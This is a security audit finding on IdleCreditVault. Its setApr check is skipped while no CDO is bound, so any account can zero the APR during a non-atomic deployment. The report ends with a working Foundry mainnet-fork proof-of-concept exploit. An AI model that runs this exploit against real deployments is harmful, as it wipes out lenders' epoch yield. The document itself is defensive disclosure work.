### Title
Unauthenticated APR overwrite before IdleCDO binding steals epoch yield - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.setApr` skips its CDO/manager authorization check whenever `idleCDO == address(0)`. Because initialization does not bind the CDO, an unprivileged account can change the vault’s fixed APR during a non-atomic deployment before `setWhitelistedCDO` is called. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`initialize` configures the token, owner, manager, borrower and initial APR, but leaves `idleCDO` unset. [1](#0-0) 

The authorization bypass is explicit:

```solidity
address _cdo = idleCDO;
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
lastApr = _apr;
``` [2](#0-1) 

An attacker can therefore call `setApr(0)` between strategy initialization and CDO binding. When the honest owner or manager later starts the first epoch, `startEpoch` calculates `expectedEpochInterest` from the tampered strategy APR and records zero expected borrower interest. [4](#0-3) 

The factory configures APR and binds the CDO atomically, so factory deployments are not exposed to an external sandwich. [5](#0-4)  The vulnerable path is any production deployment or upgrade procedure that initializes the strategy and links the CDO in separate transactions.

### Impact Explanation
The attacker causes borrower interest for the epoch to be recorded as zero instead of the configured value. For example, with 1,000,000 USDC under management, a nominal 10% APR, a 30-day epoch and a 5-day buffer, the intended scaled APR is approximately 11.67%, producing approximately 9,589 USDC of expected epoch interest; the forged value produces zero. [6](#0-5) 

This permanently suppresses lender yield for that epoch unless the honest operator detects and corrects the storage value before `startEpoch`. [7](#0-6) 

### Likelihood Explanation
Likelihood is deployment-dependent. The factory path is atomic and prevents an external caller from entering the window, but manual or alternative deployment pipelines can execute `initialize` and `setWhitelistedCDO` separately. [5](#0-4) 

No privileged compromise is required: any EOA can monitor the unbound strategy and call `setApr`. [2](#0-1) 

### Recommendation
Do not make authorization depend on an unset `idleCDO`. Configure the APR atomically during `initialize`, or initialize a one-time setup caller that alone may call `setAprs` before `setWhitelistedCDO`. Alternatively, bind `idleCDO` during strategy initialization and require all later APR changes to come from the CDO or manager.

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOCreditVault} from "../contracts/IdleCDOCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract AprSetupSpoofTest is Test {
  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  uint256 constant FORK_BLOCK = 18678289;

  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address borrower = makeAddr("borrower");
  address lender = makeAddr("lender");
  address attacker = makeAddr("attacker");
  address proxyAdmin = makeAddr("proxyAdmin");

  function testUnboundStrategyAprSpoof() public {
    vm.createSelectFork("mainnet", FORK_BLOCK);

    IdleCreditVault strategyImpl = new IdleCreditVault();
    IdleCreditVault strategy = IdleCreditVault(address(
      new TransparentUpgradeableProxy(
        address(strategyImpl),
        proxyAdmin,
        abi.encodeCall(
          IdleCreditVault.initialize,
          (USDC, owner, manager, borrower, "borrower", 10e18)
        )
      )
    ));

    // Non-atomic deployment window: strategy is initialized but no CDO is bound.
    vm.prank(attacker);
    strategy.setApr(0);

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(
      new TransparentUpgradeableProxy(
        address(cdoImpl),
        proxyAdmin,
        abi.encodeWithSelector(
          IdleCDOCreditVault.initialize.selector,
          0,
          USDC,
          owner,
          owner,
          address(0),
          address(strategy),
          100_000
        )
      )
    ));

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    uint256 principal = 1_000_000e6;
    deal(USDC, lender, principal);
    vm.startPrank(lender);
    IERC20Detailed(USDC).approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    vm.prank(manager);
    cdo.startEpoch();

    assertEq(strategy.lastApr(), 0);
    assertEq(cdo.expectedEpochInterest(), 0);
    assertEq(IERC20Detailed(USDC).balanceOf(borrower), principal);
  }
}
```
